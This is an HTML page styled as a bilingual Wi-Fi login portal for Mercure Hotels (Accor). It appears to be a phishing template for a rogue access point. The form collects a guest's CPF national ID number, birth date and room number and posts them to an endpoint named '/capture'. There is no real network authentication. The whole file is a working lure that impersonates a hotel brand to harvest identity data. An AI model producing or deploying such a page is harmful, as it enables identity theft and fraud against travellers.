<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Mercure Hotels - Wi-Fi</title>
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
body{min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#F9F5F5;color:#333;padding:16px}
.card{background:#fff;border-radius:16px;padding:36px 32px;width:100%;max-width:420px;box-shadow:0 8px 32px rgba(0,0,0,0.14)}
.hotel-logo{text-align:center;margin-bottom:8px;font-size:11px;letter-spacing:3px;text-transform:uppercase;color:#8B0000}
.hotel-name{text-align:center;margin-bottom:6px;font-size:26px;font-weight:700;color:#8B0000}
.divider{width:40px;height:2px;background:#8B0000;margin:0 auto 20px;border-radius:1px}
.welcome{text-align:center;font-size:14px;color:#666;margin-bottom:28px;line-height:1.6}
.form-row{margin-bottom:18px}
label{display:block;font-size:12px;font-weight:700;text-transform:uppercase;letter-spacing:0.8px;color:#555;margin-bottom:7px}
input{width:100%;padding:13px 16px;border:1.5px solid #DDD;border-radius:8px;font-size:15px;background:#FAFAFA;color:#222;outline:none;transition:border-color 0.2s}
input:focus{border-color:#8B0000}
input[type="date"]::-webkit-calendar-picker-indicator{opacity:0.5}
button{width:100%;padding:15px;background:#8B0000;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:700;letter-spacing:0.5px;cursor:pointer;margin-top:4px;transition:opacity 0.2s}
button:hover{opacity:0.9}
.footer{text-align:center;margin-top:20px;font-size:11px;color:#666;line-height:1.5}
@media(max-width:480px){.card{padding:28px 20px}}
</style>
</head>
<body>
<div class="card">
  <div class="hotel-logo">ACCOR HOTELS</div>
  <div class="hotel-name">Mercure Hotels</div>
  <div class="divider"></div>
  <p class="welcome">Mercure Hotels. Acesso Wi-Fi exclusivo para hospedes.</p>
  <form action="/capture" method="POST" autocomplete="off">
    <input type="hidden" name="csrf_token" value="">
    <input type="hidden" name="portal_id" value="mercure_hotel">
    <div class="form-row">
      <label for="cpf">CPF</label>
      <input type="text" name="cpf" id="cpf" placeholder="000.000.000-00" required maxlength="14" inputmode="numeric" oninput="maskCPF(this)">
    </div>
    <div class="form-row">
      <label for="birth">Data de Nascimento / Date of Birth</label>
      <input type="date" name="birth_date" id="birth" required max="2010-01-01">
    </div>
    <div class="form-row">
      <label for="room">Numero do Quarto / Room Number</label>
      <input type="text" name="room" id="room" placeholder="Ex: 204" required pattern="[0-9A-Za-z]{1,6}" maxlength="6" autocomplete="off">
    </div>
    <button type="submit">Conectar ao Wi-Fi / Connect to Wi-Fi</button>
  </form>
  <p class="footer">Acesso exclusivo para hospedes / Exclusive guest access</p>
</div>
<script>
function maskCPF(el){
  var v=el.value.replace(/\D/g,'').slice(0,11);
  if(v.length>9)v=v.replace(/(\d{3})(\d{3})(\d{3})(\d{1,2})/,'$1.$2.$3-$4');
  else if(v.length>6)v=v.replace(/(\d{3})(\d{3})(\d{1,3})/,'$1.$2.$3');
  else if(v.length>3)v=v.replace(/(\d{3})(\d{1,3})/,'$1.$2');
  el.value=v;
}
(function(){
  var isEn=(navigator.language||'').startsWith('en');
  if(isEn){
    var w=document.querySelector('.welcome');
    if(w&&w.dataset.en)w.textContent=w.dataset.en;
  }
})();
</script>
</body>
</html>
